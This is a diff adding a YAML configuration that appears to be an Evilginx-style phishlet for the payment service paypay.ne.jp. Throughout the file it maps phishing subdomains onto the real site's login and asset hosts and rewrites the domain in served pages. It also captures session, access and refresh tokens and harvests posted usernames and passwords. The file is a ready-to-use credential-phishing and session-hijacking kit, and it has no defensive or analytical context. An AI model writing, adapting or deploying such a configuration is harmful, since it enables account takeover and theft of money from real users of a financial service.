@@ -1,0 +1,31 @@
+name: 'paypay'
+author: 'custom'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypay.ne.jp', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'paypay.ne.jp', session: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'paypay.ne.jp', session: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'paypay.ne.jp', session: false}
+  - {phish_sub: 'image', orig_sub: 'image', domain: 'paypay.ne.jp', session: false}
+
+sub_filters:
+  - {hostname: '{hostname}', sub: 'www', domain: 'paypay.ne.jp', search: 'paypay.ne.jp', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - {hostname: '{hostname}', sub: 'login', domain: 'paypay.ne.jp', search: 'paypay.ne.jp', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json']}
+
+auth_tokens:
+  - domain: 'paypay.ne.jp'
+    keys: ['session', 'token', 'access_token', 'refresh_token']
+
+creds:
+  - key: 'username'
+    search: ['(.*)']
+    type: 'post'
+  - key: 'password'
+    search: ['(.*)']
+    type: 'post'
+
+login:
+  username: username
+  password: password
+  url: 'https://www.paypay.ne.jp'
